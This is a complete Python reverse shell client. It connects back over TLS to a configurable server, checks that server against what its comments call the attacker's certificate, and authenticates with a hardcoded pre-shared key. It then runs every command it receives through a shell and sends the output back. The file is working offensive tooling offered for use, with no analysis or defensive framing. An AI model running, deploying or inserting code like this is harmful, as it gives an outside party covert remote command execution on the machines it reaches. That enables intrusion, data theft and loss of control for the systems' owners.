#!/usr/bin/env python3
"""
Reverse Shell Client
--------------------
This client connects back to the server and waits for commands.
It handles directory change requests specially and executes all other commands.
"""
import socket
import os
import subprocess
import ssl
import sys

# Configuration
SERVER_HOST = '127.0.0.1'  # Replace with your server's IP address
SERVER_PORT = 9999

def tls_socket():
    """
    Creates a socket over TLS that checks also cert.pem.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Wrap the socket for TLS (client-side)
    context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    context.check_hostname = False  # Optional: disable hostname check
    context.verify_mode = ssl.CERT_REQUIRED
    context.load_verify_locations("cert.pem")  # the attackers cert

    return context.wrap_socket(s, server_hostname=SERVER_HOST)

def main():
    try:
        s = tls_socket()
        s.connect((SERVER_HOST, SERVER_PORT))
        # Send PSK to authenticate themselves
        s.send(b"supersecret")
    except Exception as e:
        sys.exit(f"Connection failed: {e}")

    while True:
        try:
            data = s.recv(1024)
            if not data:
                break

            command = data.decode("utf-8", errors="ignore")
            # Handle 'cd ' (change directory) commands separately
            if command.startswith('cd '):
                try:
                    os.chdir(command[3:].strip())
                    output = ""
                except Exception as e:
                    output = f"Error changing directory: {e}\n"
            else:
                # Execute the received command using subprocess
                proc = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE
                )
                stdout, stderr = proc.communicate()
                output = stdout.decode() + stderr.decode()

            # Append current working directory as a prompt
            cwd = os.getcwd() + "> "
            final_output = output + cwd

            s.send(final_output.encode("utf-8"))
        except Exception as e:
            s.send(f"Error: {e}\n".encode("utf-8"))
            break

    s.close()

if __name__ == '__main__':
    main()
